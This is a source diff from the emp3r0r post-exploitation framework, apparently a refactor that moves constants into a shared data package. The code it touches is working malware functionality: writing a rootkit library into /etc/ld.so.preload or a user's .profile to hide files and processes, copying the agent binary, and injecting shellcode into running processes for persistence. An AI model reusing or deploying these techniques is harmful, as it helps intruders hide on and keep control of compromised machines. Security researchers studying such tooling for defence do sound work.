@@ -10,6 +10,7 @@ import (
 	"os/user"
 	"strings"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -170,11 +171,11 @@ func profiles() (err error) {
 // add libemp3r0r.so to LD_PRELOAD
 // our files and processes will be hidden from common system utilities
 func ldPreload() error {
-	if !util.IsFileExist(Libemp3r0rFile) {
-		return fmt.Errorf("%s does not exist! Try module vaccine?", Libemp3r0rFile)
+	if !util.IsFileExist(emp3r0r_data.Libemp3r0rFile) {
+		return fmt.Errorf("%s does not exist! Try module vaccine?", emp3r0r_data.Libemp3r0rFile)
 	}
 	if os.Geteuid() == 0 {
-		return ioutil.WriteFile("/etc/ld.so.preload", []byte(Libemp3r0rFile), 0600)
+		return ioutil.WriteFile("/etc/ld.so.preload", []byte(emp3r0r_data.Libemp3r0rFile), 0600)
 	}
 
 	// if no root, we will just add libemp3r0r.so to bash profile
@@ -183,7 +184,7 @@ func ldPreload() error {
 		log.Print(err)
 		return err
 	}
-	return util.AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
+	return util.AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+emp3r0r_data.Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
@@ -199,7 +200,7 @@ func AddCronJob(job string) error {
 func injector() (err error) {
 	// this shellcode forks a process and executes emp3r0r agent
 	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
-	err = util.Copy(os.Args[0], GuardianAgentPath)
+	err = util.Copy(os.Args[0], emp3r0r_data.GuardianAgentPath)
 	if err != nil {
 		return
 	}
@@ -218,14 +219,14 @@ func injector() (err error) {
 				return
 			}
 			log.Printf("Injecting to %s (%d)...", util.ProcCmdline(pid), pid)
-			e := Injector(&GuardianShellcode, pid)
+			e := Injector(&emp3r0r_data.GuardianShellcode, pid)
 			if e != nil {
 				err = fmt.Errorf("%v, %v", err, e)
 			}
 		}(pid)
 	}
 	if err != nil {
-		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&GuardianShellcode, 0))
+		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&emp3r0r_data.GuardianShellcode, 0))
 	}
 
 	return
